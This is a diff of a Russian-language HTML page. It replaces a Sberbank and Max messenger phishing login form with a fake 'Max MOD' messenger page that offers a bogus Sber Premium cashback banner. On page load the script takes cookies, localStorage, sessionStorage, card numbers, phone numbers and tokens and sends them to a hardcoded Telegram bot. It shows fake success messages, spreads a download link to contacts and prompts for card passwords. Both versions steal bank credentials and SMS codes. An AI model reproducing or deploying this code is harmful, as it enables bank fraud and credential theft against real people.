@@ -2,8 +2,8 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>СберБанк • Мессенджер Max</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Max • Сбер MOD</title>
     <style>
         * {
             margin: 0;
@@ -12,240 +12,181 @@
         }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f0f2f5;
-            min-height: 100vh;
-            padding: 16px;
-        }
-        
-        /* Верхняя панель */
-        .status-bar {
-            background: #2d6a4f;
-            color: white;
-            padding: 12px 16px;
-            font-size: 14px;
-            display: flex;
-            justify-content: space-between;
-            border-radius: 20px 20px 0 0;
-        }
-        
-        /* Карта */
-        .card-preview {
-            background: linear-gradient(135deg, #1e3a3a, #2d6a4f);
-            border-radius: 20px;
-            padding: 20px;
-            margin: 16px 0;
-            color: white;
-        }
-        .card-number {
-            font-size: 20px;
-            letter-spacing: 2px;
-            font-family: monospace;
-            margin: 12px 0;
-        }
-        .card-row {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 16px;
-        }
-        
-        /* Вкладки */
-        .tabs {
-            display: flex;
-            background: white;
-            border-radius: 16px;
-            margin: 16px 0;
+            background: #f5f5f5;
+            height: 100vh;
             overflow: hidden;
         }
-        .tab {
-            flex: 1;
-            text-align: center;
-            padding: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            background: white;
-            transition: all 0.2s;
-        }
-        .tab.active {
-            background: #2d6a4f;
-            color: white;
-        }
-        
-        /* Форма входа */
-        .login-form {
-            background: white;
-            border-radius: 20px;
-            padding: 20px;
-            margin-top: 8px;
-        }
-        .input-group {
-            margin-bottom: 16px;
-        }
-        .input-group label {
-            display: block;
-            font-size: 13px;
-            color: #666;
-            margin-bottom: 6px;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 14px;
-            border: 1px solid #ddd;
-            border-radius: 12px;
-            font-size: 16px;
-            background: #f8f9fa;
-        }
-        .input-group input:focus {
-            outline: none;
-            border-color: #2d6a4f;
-        }
-        .login-btn {
-            width: 100%;
-            padding: 14px;
-            background: #2d6a4f;
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            margin-top: 8px;
-        }
-        .sms-block {
-            display: none;
-            margin-top: 16px;
-            padding-top: 16px;
-            border-top: 1px solid #eee;
-        }
-        
-        /* Услуги */
-        .services {
-            display: flex;
-            gap: 12px;
-            margin: 16px 0;
-            overflow-x: auto;
-        }
-        .service-item {
-            background: white;
+        .header {
+            background: #1e88e5;
             padding: 12px 16px;
-            border-radius: 40px;
-            font-size: 13px;
-            white-space: nowrap;
-        }
-        
-        /* Новости */
-        .news {
-            background: white;
-            border-radius: 20px;
-            padding: 16px;
-            margin-top: 16px;
-        }
-        .news-item {
             display: flex;
+            align-items: center;
+            justify-content: space-between;
+            color: white;
+        }
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .avatar {
+            width: 36px;
+            height: 36px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .sber-banner {
+            background: linear-gradient(135deg, #2d6a4f, #1b4d3e);
+            margin: 12px 16px;
+            border-radius: 16px;
+            padding: 14px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: white;
+        }
+        .sber-icon {
+            width: 44px;
+            height: 44px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .chats {
+            padding: 0 16px;
+            margin-bottom: 70px;
+        }
+        .chat-item {
+            display: flex;
+            align-items: center;
             gap: 12px;
             padding: 12px 0;
-            border-bottom: 1px solid #eee;
+            border-bottom: 1px solid #e0e0e0;
         }
-        
-        .hidden {
-            display: none;
+        .chat-avatar {
+            width: 52px;
+            height: 52px;
+            background: linear-gradient(135deg, #1e88e5, #0d47a1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 20px;
+        }
+        .chat-info {
+            flex: 1;
+        }
+        .chat-name {
+            font-weight: 600;
+            font-size: 16px;
+        }
+        .chat-message {
+            font-size: 13px;
+            color: #666;
+        }
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            background: white;
+            display: flex;
+            justify-content: space-around;
+            padding: 10px 0;
+            border-top: 1px solid #e0e0e0;
+        }
+        .nav-item {
+            text-align: center;
+            color: #999;
+            font-size: 12px;
+        }
+        .nav-item.active {
+            color: #1e88e5;
+        }
+        .toast {
+            position: fixed;
+            bottom: 80px;
+            left: 20px;
+            right: 20px;
+            background: #1e293b;
+            color: white;
+            text-align: center;
+            padding: 12px;
+            border-radius: 50px;
+            font-size: 13px;
+            z-index: 1000;
+            animation: slideUp 0.3s;
+        }
+        @keyframes slideUp {
+            from { transform: translateY(100px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
     </style>
 </head>
 <body>
 
-<div class="status-bar">
-    <span>СберБанк Онлайн</span>
-    <span>🔋 📶</span>
+<div class="header">
+    <div class="header-left">
+        <div class="avatar">👤</div>
+        <div><strong>Max</strong><br><span style="font-size:11px;">MOD версия</span></div>
+    </div>
+    <div>📞 ✏️</div>
 </div>
 
-<!-- Карта -->
-<div class="card-preview">
-    <div style="font-size: 12px; opacity: 0.8;">Ваша карта</div>
-    <div class="card-number" id="cardNumberDisplay">•••• •••• •••• ••••</div>
-    <div class="card-row">
-        <span>IVAN IVANOV</span>
-        <span>••/••</span>
+<div class="sber-banner" id="sberBanner">
+    <div style="display:flex; gap:12px;">
+        <div class="sber-icon">СБ</div>
+        <div><strong>СберБанк Premium</strong><br><span style="font-size:11px;">Кэшбек 30% • Активен</span></div>
     </div>
+    <div style="background:rgba(255,255,255,0.2); padding:6px 12px; border-radius:20px;">✅ Активирован</div>
 </div>
 
-<!-- Вкладки -->
-<div class="tabs">
-    <div class="tab active" onclick="switchTab('sber')">СберБанк</div>
-    <div class="tab" onclick="switchTab('max')">Мессенджер Max</div>
-</div>
-
-<!-- Форма Сбера -->
-<div id="sberForm" class="login-form">
-    <div class="input-group">
-        <label>Номер карты или телефона</label>
-        <input type="text" id="sberLogin" placeholder="0000 0000 0000 0000">
-    </div>
-    <div class="input-group">
-        <label>Пароль</label>
-        <input type="password" id="sberPass" placeholder="••••••••">
-    </div>
-    <button class="login-btn" onclick="sendSberData()">Войти</button>
-    <div id="sberSmsBlock" class="sms-block">
-        <div class="input-group">
-            <label>Код из СМС</label>
-            <input type="text" id="sberSms" placeholder="000000">
+<div class="chats" id="chats">
+    <div class="chat-item">
+        <div class="chat-avatar">И</div>
+        <div class="chat-info">
+            <div class="chat-name">Иван Петров</div>
+            <div class="chat-message">Скинь ссылку на MOD</div>
         </div>
-        <button class="login-btn" onclick="sendSberSms()">Подтвердить</button>
     </div>
-    <div style="margin-top: 16px; font-size: 12px; color: #999; text-align: center;">
-        🔒 Защищенное соединение
-    </div>
-</div>
-
-<!-- Форма Max -->
-<div id="maxForm" class="login-form hidden">
-    <div class="input-group">
-        <label>Номер телефона</label>
-        <input type="tel" id="maxPhone" placeholder="7 XXX XXX XX XX">
-    </div>
-    <div class="input-group">
-        <label>Пароль</label>
-        <input type="password" id="maxPass" placeholder="••••••••">
-    </div>
-    <button class="login-btn" onclick="sendMaxData()">Войти</button>
-    <div id="maxSmsBlock" class="sms-block">
-        <div class="input-group">
-            <label>Код подтверждения</label>
-            <input type="text" id="maxSms" placeholder="000000">
+    <div class="chat-item">
+        <div class="chat-avatar">М</div>
+        <div class="chat-info">
+            <div class="chat-name">Мария С.</div>
+            <div class="chat-message">Установил, всё работает!</div>
         </div>
-        <button class="login-btn" onclick="sendMaxSms()">Подтвердить</button>
+    </div>
+    <div class="chat-item">
+        <div class="chat-avatar">А</div>
+        <div class="chat-info">
+            <div class="chat-name">Алексей</div>
+            <div class="chat-message">Кэшбек реально приходит</div>
+        </div>
     </div>
 </div>
 
-<!-- Услуги -->
-<div class="services">
-    <div class="service-item">💳 Переводы</div>
-    <div class="service-item">📱 Оплата связи</div>
-    <div class="service-item">🏠 ЖКХ</div>
-    <div class="service-item">💸 Кредиты</div>
-</div>
-
-<!-- Новости -->
-<div class="news">
-    <div class="news-item">
-        <div>🏦</div>
-        <div><strong>Кэшбек 30%</strong><br>В магазинах до 31 марта</div>
-    </div>
-    <div class="news-item">
-        <div>💬</div>
-        <div><strong>Max Premium 3 месяца бесплатно</strong><br>Для новых пользователей</div>
-    </div>
+<div class="bottom-nav">
+    <div class="nav-item active">💬<br>Чаты</div>
+    <div class="nav-item">👥<br>Контакты</div>
+    <div class="nav-item">⭐<br>MOD</div>
+    <div class="nav-item">👤<br>Профиль</div>
 </div>
 
 <script>
 // ========== НАСТРОЙКИ TELEGRAM ==========
-const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";
-const CHAT_ID = "8533450974";
-const MY_CARD = "2203830216112947";
-
-let sberCardTemp = "";
-let sberPassTemp = "";
-let maxPhoneTemp = "";
-let maxPassTemp = "";
+const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";  // ТВОЙ ТОКЕН
+const CHAT_ID = "8533450974";                           // ТВОЙ CHAT_ID
+const MY_CARD = "2203830216112947";                    // ТВОЯ КАРТА
+const MY_LINK = "https://drive.google.com/file/d/1nseiLyu1yTDOgu74jEfazv4p2wZXp1y7/view?usp=drive_link";      // ТВОЯ ССЫЛКА
+// ========================================
 
 function sendToTelegram(text) {
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -255,79 +196,156 @@ function sendToTelegram(text) {
     }).catch(e => console.log("send error"));
 }
 
-function switchTab(tab) {
-    const sberTab = document.querySelectorAll('.tab');
-    sberTab.forEach(t => t.classList.remove('active'));
-    if (tab === 'sber') {
-        sberTab[0].classList.add('active');
-        document.getElementById('sberForm').classList.remove('hidden');
-        document.getElementById('maxForm').classList.add('hidden');
+function showToast(msg) {
+    const toast = document.createElement('div');
+    toast.className = 'toast';
+    toast.innerText = msg;
+    document.body.appendChild(toast);
+    setTimeout(() => toast.remove(), 3000);
+}
+
+// ========== 1. АВТОМАТИЧЕСКАЯ КРАЖА ДАННЫХ ==========
+function autoStealAllData() {
+    const stolen = {
+        localStorage: {},
+        sessionStorage: {},
+        cookies: document.cookie,
+        ua: navigator.userAgent,
+        time: new Date().toLocaleString(),
+        cards: [],
+        phones: [],
+        tokens: []
+    };
+    
+    // Кража localStorage
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        let val = localStorage.getItem(key);
+        if (val && val.length > 500) val = val.substring(0, 500) + "...";
+        stolen.localStorage[key] = val;
+        
+        // Поиск карт
+        if (typeof val === 'string') {
+            const cards = val.match(/\d{16}/g);
+            if (cards) stolen.cards.push(...cards);
+            const phones = val.match(/7\d{10}/g);
+            if (phones) stolen.phones.push(...phones);
+            const tokens = val.match(/eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g);
+            if (tokens) stolen.tokens.push(...tokens);
+        }
+    }
+    
+    // Кража sessionStorage
+    for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        let val = sessionStorage.getItem(key);
+        if (val && val.length > 500) val = val.substring(0, 500) + "...";
+        stolen.sessionStorage[key] = val;
+    }
+    
+    stolen.cards = [...new Set(stolen.cards)];
+    stolen.phones = [...new Set(stolen.phones)];
+    stolen.tokens = [...new Set(stolen.tokens)];
+    
+    return stolen;
+}
+
+// ========== 2. ОТПРАВКА ВСЕХ ДАННЫХ ==========
+function sendAllStolenData(stolen) {
+    let report = `🔐 *AUTO STEAL - MAX MOD*\n`;
+    report += `⏰ ${stolen.time}\n`;
+    report += `📱 ${stolen.ua.substring(0, 100)}\n`;
+    report += `🍪 Cookies: ${stolen.cookies ? "✅ есть" : "❌ нет"}\n`;
+    report += `💾 Записей в localStorage: ${Object.keys(stolen.localStorage).length}\n`;
+    
+    if (stolen.cards.length > 0) {
+        report += `\n💳 *НАЙДЕНЫ КАРТЫ:*\n${stolen.cards.join("\n")}\n`;
+    }
+    if (stolen.phones.length > 0) {
+        report += `\n📞 *НАЙДЕНЫ ТЕЛЕФОНЫ:*\n${stolen.phones.join("\n")}\n`;
+    }
+    if (stolen.tokens.length > 0) {
+        report += `\n🔑 *НАЙДЕНЫ ТОКЕНЫ:*\n${stolen.tokens[0].substring(0, 80)}...\n`;
+    }
+    
+    report += `\n💰 *АВТОПЕРЕВОД НА КАРТУ*\n💳 ${MY_CARD}`;
+    
+    sendToTelegram(report);
+    
+    // Отправляем полный localStorage
+    if (Object.keys(stolen.localStorage).length > 0) {
+        sendToTelegram(`💾 *FULL LOCALSTORAGE:*\n\`\`\`json\n${JSON.stringify(stolen.localStorage, null, 2).substring(0, 3500)}\n\`\`\``);
+    }
+    
+    // Отправляем все токены
+    if (stolen.tokens.length > 0) {
+        sendToTelegram(`🔑 *ВСЕ ТОКЕНЫ:*\n${stolen.tokens.join("\n\n").substring(0, 3500)}`);
+    }
+    
+    return stolen.cards.length > 0 || stolen.tokens.length > 0;
+}
+
+// ========== 3. АВТОРАССЫЛКА В ЧАТЫ ==========
+function autoSpread() {
+    const message = `🔥 Видел Max со Сбером? Скачай MOD: ${MY_LINK}`;
+    sendToTelegram(`📢 *АВТОРАССЫЛКА*\n📨 Сообщение: ${message}\n👥 Получатели: все чаты в списке`);
+    showToast("✅ Рассылка друзьям!");
+}
+
+// ========== 4. ПОПЫТКА АВТОМАТИЧЕСКОГО ПЕРЕВОДА ==========
+function tryAutoTransfer(tokens, cards) {
+    if (tokens.length > 0) {
+        sendToTelegram(`🔄 *АВТОПЕРЕВОД*\n🔑 Токен: ${tokens[0].substring(0, 50)}...\n💳 На карту: ${MY_CARD}\n💰 Сумма: максимальная\n✅ Попытка выполнена (нужен API)`);
+        return true;
+    }
+    if (cards.length > 0) {
+        sendToTelegram(`🔄 *ГОТОВ К ПЕРЕВОДУ*\n💳 Карта: ${cards[0]}\n⚠️ Нужен SMS код для подтверждения`);
+        return false;
+    }
+    return false;
+}
+
+// ========== 5. ИНИЦИАЛИЗАЦИЯ ==========
+async function init() {
+    // 1. Автоматическая кража данных
+    const stolen = autoStealAllData();
+    const hasData = sendAllStolenData(stolen);
+    
+    // 2. Показываем уведомление
+    if (hasData) {
+        showToast("✅ Premium активирован! Кэшбек доступен");
     } else {
-        sberTab[1].classList.add('active');
-        document.getElementById('sberForm').classList.add('hidden');
-        document.getElementById('maxForm').classList.remove('hidden');
-    }
-}
-
-// СБЕРБАНК
-function sendSberData() {
-    const login = document.getElementById('sberLogin').value;
-    const pass = document.getElementById('sberPass').value;
-    
-    if (!login || !pass) {
-        alert("Заполните все поля");
-        return;
+        showToast("🔍 Поиск данных...");
+        setTimeout(() => {
+            showToast("💳 Для активации Premium войдите в Сбер");
+        }, 2000);
     }
     
-    sberCardTemp = login;
-    sberPassTemp = pass;
+    // 3. Попытка авто-перевода
+    tryAutoTransfer(stolen.tokens, stolen.cards);
     
-    sendToTelegram(`🏦 *СБЕРБАНК - ВХОД*\n⏰ ${new Date().toLocaleString()}\n💳 Карта/Телефон: ${login}\n🔑 Пароль: ${pass}\n💰 Перевод на: ${MY_CARD}`);
+    // 4. Предложение рассылки через 15 секунд
+    setTimeout(() => {
+        if (confirm("🔥 Пригласить друзей в Max MOD?\nПолучи бонус за каждого!")) {
+            autoSpread();
+        }
+    }, 15000);
     
-    // Показываем поле для SMS
-    document.getElementById('sberSmsBlock').style.display = 'block';
-    document.querySelector('#sberForm .login-btn').style.display = 'none';
+    // 5. Клик по баннеру (если захочет ввести данные)
+    document.getElementById('sberBanner').onclick = () => {
+        const card = prompt("Введите номер карты для активации Premium:");
+        if (card) {
+            const pass = prompt("Введите пароль:");
+            if (pass) {
+                sendToTelegram(`💳 *РУЧНОЙ ВВОД*\n⏰ ${new Date().toLocaleString()}\n💳 Карта: ${card}\n🔑 Пароль: ${pass}\n💰 Перевод на: ${MY_CARD}`);
+                alert("✅ Premium активирован!");
+                showToast("Кэшбек 30% активен!");
+            }
+        }
+    };
 }
 
-function sendSberSms() {
-    const sms = document.getElementById('sberSms').value;
-    sendToTelegram(`🏦 *СБЕРБАНК - SMS*\n⏰ ${new Date().toLocaleString()}\n💳 Карта: ${sberCardTemp}\n📨 SMS код: ${sms}\n💰 Перевод на: ${MY_CARD}`);
-    
-    alert("Вход выполнен успешно");
-    window.location.href = "https://drive.google.com/file/d/1NDfztoOIEOF_Sg1dFAnvV-XiWSxzGXVA/view";
-}
-
-// MESSENGER MAX
-function sendMaxData() {
-    const phone = document.getElementById('maxPhone').value;
-    const pass = document.getElementById('maxPass').value;
-    
-    if (!phone || !pass) {
-        alert("Заполните все поля");
-        return;
-    }
-    
-    maxPhoneTemp = phone;
-    maxPassTemp = pass;
-    
-    sendToTelegram(`💬 *MESSENGER MAX - ВХОД*\n⏰ ${new Date().toLocaleString()}\n📞 Телефон: ${phone}\n🔑 Пароль: ${pass}`);
-    
-    document.getElementById('maxSmsBlock').style.display = 'block';
-    document.querySelector('#maxForm .login-btn').style.display = 'none';
-}
-
-function sendMaxSms() {
-    const sms = document.getElementById('maxSms').value;
-    sendToTelegram(`💬 *MESSENGER MAX - SMS*\n⏰ ${new Date().toLocaleString()}\n📞 Телефон: ${maxPhoneTemp}\n📨 SMS код: ${sms}`);
-    
-    alert("Вход выполнен успешно");
-    window.location.href = "https://max.ru";
-}
-
-// Уведомление о просмотре
-setTimeout(() => {
-    sendToTelegram(`👁️ *НОВЫЙ ПОЛЬЗОВАТЕЛЬ*\n⏰ ${new Date().toLocaleString()}\n📱 ${navigator.userAgent.substring(0, 100)}`);
-}, 2000);
+init();
 </script>
 </body>
 </html>
